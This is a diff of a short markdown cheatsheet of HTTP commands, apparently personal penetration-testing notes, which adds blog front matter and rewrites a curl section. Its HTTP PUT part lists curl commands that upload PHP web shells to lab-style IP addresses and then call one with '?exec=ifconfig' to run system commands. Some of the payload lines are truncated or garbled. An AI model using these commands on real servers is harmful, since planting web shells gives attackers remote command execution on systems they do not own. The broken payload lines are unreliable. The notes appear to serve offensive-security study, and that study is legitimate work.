@@ -1,3 +1,10 @@
+---
+layout: post
+title: HTTP Commands
+description: HTTP cheetsheet
+date: 2022-04-09
+---
+
 # Handy HTTP commands
 
 ### curl
@@ -13,18 +20,24 @@ User agent change
 `curl -A "Mozilla/5.0 (Windows NT 6.1; Win64; x64; rv:59.0) Gecko/20100101 Firefox/59.0"`
 
 #### HTTP PUT
+```
+curl http://victim-site.com --upload-file file.txt
 
-`curl http://victim-site.com --upload-file file.txt`
+curl -X PUT -d '' http://192.168.0.105/test/shell.php
 
-`curl -X PUT -d '' http://192.168.0.105/test/shell.php`
+curl -X PUT -d '' http://10.11.1.14/shell.asp
 
-`curl -X PUT -d '' http://10.11.1.14/shell.asp`
+curl -X PUT -d 'http://10.11.0.220/shell-p-444.asp' http://10.11.1.14/shell.asp
 
-`curl -X PUT -d 'http://10.11.0.220/shell-p-444.asp' http://10.11.1.14/shell.asp`
+curl -X PUT -d '&%d 2>&%d",f,f,f)' ?>' http://10.11.1.14/shell.txt
 
-`curl -X PUT -d '&%d 2>&%d",f,f,f)' ?>' http://10.11.1.14/shell.txt`
+curl -X PUT -d '"; $cmd = ($_REQUEST['cmd']); system($cmd); echo ""; die; }?>' http://10.11.1.229/poopypants.txt
 
-`curl -X PUT -d '"; $cmd = ($_REQUEST['cmd']); system($cmd); echo ""; die; }?>' http://10.11.1.229/poopypants.txt`
+curl -X PUT -d '<?php system($_GET["exec"]); ?>' http://192.168.0.105/test/shell.php
+-> http://192.168.0.105/test/shell.php/?exec=ifconfig
+
+curl -X PUT -d '<?php system($_REQUEST["exec"]); ?>' http://10.11.1.14/shell.asp
+```
 
 ### wget
 
